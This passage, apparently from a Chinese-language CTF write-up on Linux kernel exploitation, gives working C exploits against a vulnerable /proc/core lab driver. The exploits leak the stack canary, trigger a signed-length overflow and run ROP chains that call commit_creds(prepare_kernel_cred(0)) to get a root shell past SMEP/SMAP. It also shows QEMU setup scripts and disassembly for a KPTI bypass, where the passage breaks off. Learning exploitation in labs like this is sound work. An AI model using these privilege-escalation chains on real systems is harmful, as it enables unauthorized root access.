class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889A</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds = (<span class="type">void</span> *) ((<span class="type">size_t</span>) commit_creds + offset);</span><br><span class="line">            prepare_kernel_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) prepare_kernel_cred + offset);</span><br><span class="line">            init_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) init_cred + offset);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    core_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    rebase();</span><br><span class="line">    save_status();</span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line">    *(<span class="type">void</span> **) &amp;buf[<span class="number">80</span>] = get_root;</span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// jg 有符号判断，判其为负数，qmemcpy() 第三个参数取其后16位，导致溢出。</span></span><br><span class="line">    core_copy_func(<span class="number">0xffffffffffff0000</span> | <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="kernel-rop-without-KPIT"><a href="#kernel-rop-without-KPIT" class="headerlink" title="kernel rop without KPIT"></a>kernel rop without KPIT</h2><p>开启 smep 和 smap 保护后，内核空间无法执行用户空间的代码，并且无法访问用户空间的数据。因此不能直接 ret2user 。利用 ROP ，执行 <code>commit_creds(prepare_kernel_cred(0))</code> , 然后 <code>iret</code> 返回用户空间可以绕过上述保护。</p>
<p>添加 <code>smep</code> 和 <code>smap</code> 保护。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line">-cpu qemu64,+smep,+smap</span><br></pre></td></tr></table></figure></div>

<p>由于找不到 <code>mov rdi, rax; ret;</code> 这条 <code>gadget</code> ，因此需要用 <code>mov rdi, rax; call rdx;</code> 代替，其中 <code>rdx</code> 指向 <code>pop rcx; ret;</code> 可以清除 <code>call</code> 指令压入栈中的 <code>rip</code> ，因此相当于 <code>ret</code> 。</p>
<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
<li>从 <code>/tmp/kallsyms</code> 读取符号地址，确认与<code>nokaslr</code>偏移，从vmlinux寻找<code>gadget</code>。</li>
<li>保存用户状态。</li>
<li>通过设置 <code>off</code> 读取 <code>canary</code>。</li>
<li>于内核空间 <code>rop</code> 调用 <code>commit_creds(prepare_kernel_cred(NULL))</code>提权。</li>
<li>通过 <code>swapgs; popfq; ret;</code> ，<code>iretq</code> 返回用户空间，并执行 <code>system(&quot;/bin/sh&quot;);</code>。</li>
</ol>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// from vmlinux</span></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdx_ret = <span class="number">0xffffffff810a0f49</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rcx_ret = <span class="number">0xffffffff81021e53</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rdi_rax_call_rdx = <span class="number">0xffffffff8101aa6a</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_popfq_ret = <span class="number">0xffffffff81a012da</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff81050ac2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889A</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds += offset;</span><br><span class="line">            prepare_kernel_cred += offset;</span><br><span class="line">            init_cred += offset;</span><br><span class="line">            pop_rdi_ret += offset;</span><br><span class="line">            pop_rdx_ret += offset;</span><br><span class="line">            pop_rcx_ret += offset;</span><br><span class="line">            mov_rdi_rax_call_rdx += offset;</span><br><span class="line">            swapgs_popfq_ret += offset;</span><br><span class="line">            iretq += offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    core_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line">    rebase();</span><br><span class="line"></span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *rop = (<span class="type">size_t</span> *) &amp;buf[<span class="number">80</span>], it = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    rop[it++] = pop_rdi_ret;</span></span><br><span class="line"><span class="comment">//    rop[it++] = init_cred;</span></span><br><span class="line"><span class="comment">//    rop[it++] = commit_creds;</span></span><br><span class="line">    </span><br><span class="line">    rop[it++] = pop_rdi_ret;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = prepare_kernel_cred;</span><br><span class="line">    rop[it++] = pop_rdx_ret; <span class="comment">// rdx ==&gt; pop_rcx_ret_addr</span></span><br><span class="line">    rop[it++] = pop_rcx_ret;</span><br><span class="line">    <span class="comment">// rax==prepare_kernel_cred(0), cal rdx ==&gt; push commit_creds_addr, then pop_rcx_ret</span></span><br><span class="line">    rop[it++] = mov_rdi_rax_call_rdx; </span><br><span class="line">    rop[it++] = commit_creds;</span><br><span class="line">    </span><br><span class="line">    rop[it++] = swapgs_popfq_ret;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = iretq;</span><br><span class="line">    rop[it++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[it++] = user_cs;</span><br><span class="line">    rop[it++] = user_rflags;</span><br><span class="line">    rop[it++] = user_sp;</span><br><span class="line">    rop[it++] = user_ss;</span><br><span class="line"></span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    core_copy_func(<span class="number">0xffffffffffff0000</span> | <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="kernel-rop-with-KPIT"><a href="#kernel-rop-with-KPIT" class="headerlink" title="kernel rop with KPIT"></a>kernel rop with KPIT</h2><p>开启 kpti</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -m 256M \</span><br><span class="line">  -kernel ./bzImage \</span><br><span class="line">  -initrd ./core.cpio \</span><br><span class="line">  -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot;</span> \</span><br><span class="line">  -s \</span><br><span class="line">  -netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">  -nographic \</span><br><span class="line">  -cpu kvm64,+smep,+smap</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>此时需要借助 <code>swapgs_restore_regs_and_return_to_usermode</code> 返回用户态。该函数是内核在 <code>arch/x86/entry/entry_64.S</code> 中提供的一个用于完成内核态到用户态切换的函数。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81A008DA ; __int64 swapgs_restore_regs_and_return_to_usermode(void)</span><br><span class="line">.text:FFFFFFFF81A008DA                 public swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">.text:FFFFFFFF81A008DA swapgs_restore_regs_and_return_to_usermode proc near</span><br><span class="line">.text:FFFFFFFF81A008DA                                         ; CODE XREF: ;entry_SYSCALL_64_after_hwframe+4D↑j</span><br><span class="line">.text:FFFFFFFF81A008DA                                         ; entry_SYSCALL_64_after_hwframe+5E↑j ...</span><br><span class="line">.text:FFFFFFFF81A008DA                 pop     r15</span><br><span class="line">.text:FFFFFFFF81A008DC                 pop     r14</span><br><span class="line">.text:FFFFFFFF81A008DE                 pop     r13</span><br><span class="line">.text:FFFFFFFF81A008E0                 pop     r12</span><br><span class="line">.text:FFFFFFFF81A008E2                 pop     rbp</span><br><span class="line">.text:FFFFFFFF81A008E3                 pop     rbx</span><br><span class="line">.text:FFFFFFFF81A008E4                 pop     r11</span><br><span class="line">.text:FFFFFFFF81A008E6                 pop     r10</span><br><span class="line">.text:FFFFFFFF81A008E8                 pop     r9</span><br><span class="line">.text:FFFFFFFF81A008EA                 pop     r8</span><br><span class="line">.text:FFFFFFFF81A008EC                 pop     rax</span><br><span class="line">.text:FFFFFFFF81A008ED                 pop     rcx</span><br><span class="line">.text:FFFFFFFF81A008EE                 pop     rdx</span><br><span class="line">.text:FFFFFFFF81A008EF                 pop     rsi</span><br><span class="line">.text:FFFFFFFF81A008F0                 mov     rdi, rsp ; jump this</span><br><span class="line">.text:FFFFFFFF81A008F3                 mov     rsp, gs:qword_5004</span><br><span class="line">.text:FFFFFFFF81A008FC                 push    qword ptr [rdi+30h]</span><br><span class="line">.text:FFFFFFFF81A008FF                 push    qword ptr [rdi+28h]</span><br><span class="line">.text:FFFFFFFF81A00902                 push    qword ptr [rdi+20h]</span><br><span class="line">.text:FFFFFFFF81A00905                 push    qword ptr [rdi+18h]</span><br><span class="line">.text:FFFFFFFF81A00908                 push    qword ptr [rdi+10h]</span><br><span class="line">.text:FFFFFFFF81A0090B                 push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81A0090D                 push    rax</span><br><span class="line">.text:FFFFFFFF81A0090E                 jmp     short loc_FFFFFFFF81A00953</span><br><span class="line">[......]</span><br><span class="line">;loc_FFFFFFFF81A00953</span><br><span class="line">.text:FFFFFFFF81A00953 loc_FFFFFFFF81A00953:                   ; CODE XREF: ;swapgs_restore_regs_and_return_to_usermode+34↑j</span><br><span class="line">.text:FFFFFFFF81A00953                 pop     rax</span><br><span class="line">.text:FFFFFFFF81A00954                 pop     rdi</span><br><span class="line">.text:FFFFFFFF81A00955                 swapgs</span><br><span class="line">.text:FFFFFFFF81A00958                 jmp     native_iret</span><br><span class="line">.text:FFFFFFFF81A00958 swapgs_restore_regs_and_return_to_usermode endp</span><br><span class="line">[......]</span><br><span class="line">;native_iret</span><br><span class="line">.text:FFFFFFFF81A00980                 test    [rsp+arg_18], 4</span><br><span class="line">.text:FFFFFFFF81A00985                 jnz     short native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81A00985 native_iret     endp</span><br><span class="line">[......]</span><br><span class="line">;native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81A00989                 push    rdi</span><br><span class="line">.text:FFFFFFFF81A0098A                 swapgs</span><br><span class="line">.text:FFFFFFFF81A0098D                 jmp     short loc_FFFFFFFF81A009A1</span><br><span class="line">[......]</span><br><span class="line">;loc_FFFFFFFF81A009A1</span><br><span class="line">.text:FFFFFFFF81A009A1                 mov     rdi, gs:qword_F000</span><br><span class="line">.text:FFFFFFFF81A009AA                 mov     [rdi], rax</span><br><span class="line">.text:FFFFFFFF81A009AD                 mov     rax, [rsp+8]</span><br><span class="line">.text:FFFFFFFF81A009B2                 mov     [rdi+8], rax</span><br><span class="line">.text:FFFFFFFF81A009B6                 mov     rax, [rsp+8+arg_0]</span><br><span class="line">.text:FFFFFFFF81A009BB                 mov     [rdi+10h], rax</span><br><span class="line">.text:FFFFFFFF81A009BF                 mov     rax, [rsp+8+arg_8]</span><br><span class="line">.text:FFFFFFFF81A009C4                 mov     [rdi+18h], rax</span><br><span class="line">.text:FFFFFFFF81A009C8                 mov     rax, [rsp+8+arg_18]</span><br><span class="line">.text:FFFFFFFF81A009CD                 mov     [rdi+28h], rax</span><br><span class="line">.text:FFFFFFFF81A009D1                 mov     rax, [rsp+8+arg_10]</span><br><span class="line">.text:FFFFFFFF81A009D6                 mov     [rdi+20h], rax</span><br><span class="line">.text:FFFFFFFF81A009DA                 and     eax, 0FFFF0000h</span><br><span class="line">.text:FFFFFFFF81A009DF                 or      rax, gs:qword_F008</span><br><span class="line">.text:FFFFFFFF81A009E8                 push    rax</span><br><span class="line">.text:FFFFFFFF81A009E9                 jmp     short loc_FFFFFFFF81A00A2E</span><br><span class="line">[......]</span><br><span class="line">;loc_FFFFFFFF81A00A2E</span><br><span class="line">.text:FFFFFFFF81A00A2E                 pop     rax</span><br><span class="line">.text:FFFFFFFF81A00A2F                 swapgs</span><br><span class="line">.text:FFFFFFFF81A00A32                 pop     rdi</span><br><span class="line">.text:FFFFFFFF81A00A33                 mov     rsp, rax</span><br><span class="line">.text:FFFFFFFF81A00A36                 pop     rax</span><br><span class="line">.text:FFFFFFFF81A00A37                 jmp     native_irq_return_iret</span><br><span class="line">[......]</span><br><span class="line">;native_irq_return_iret</span><br><span class="line">.text:FFFFFFFF81A00987                 iretq</span><br><span class="line">.text:FFFFFFFF81A00987 native_irq_return_iret endp</span><br></pre></td></tr></table></figure></div>

